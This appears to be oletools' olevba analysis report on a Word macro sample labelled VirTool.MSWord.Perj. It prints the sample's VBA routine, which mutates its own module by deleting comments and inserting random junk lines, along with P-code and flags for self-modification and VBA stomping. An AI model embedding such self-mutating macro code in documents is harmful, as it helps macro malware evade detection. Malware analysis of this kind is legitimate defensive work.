olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.Perj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.Perj - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: VirTool.MSWord.Perj - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub RndmJnkr()
For V1 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
V2 = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1), 1, 1)
If V2 = "'" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines V1, 1
Next V1
For V3 = 1 To Int(Rnd() * 49 + 1)
V4 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
V5 = Int(Rnd() * V4 + 1)
V6 = Int(Rnd() * 99 + 1)
For V7 = 1 To V6
V8 = V8 + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next V7
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines V5, "'" & V8
V8 = ""
Next V3
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: VirTool.MSWord.Perj
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul 1 - 1740 bytes
' Line #0:
' 	FuncDefn (Private Sub RndmJnkr())
' Line #1:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #2:
' 	Ld V1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St V2 
' Line #3:
' 	Ld V2 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld V1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #4:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	NextVar 
' Line #5:
' 	StartForVariable 
' 	Ld V3 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0031 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St V4 
' Line #7:
' 	ArgsLd Rnd 0x0000 
' 	Ld V4 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St V5 
' Line #8:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0063 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St V6 
' Line #9:
' 	StartForVariable 
' 	Ld V7 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld V6 
' 	For 
' Line #10:
' 	Ld V8 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St V8 
' Line #11:
' 	StartForVariable 
' 	Ld V7 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld V5 
' 	LitStr 0x0001 "'"
' 	Ld V8 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #13:
' 	LitStr 0x0000 ""
' 	St V8 
' Line #14:
' 	StartForVariable 
' 	Ld V3 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

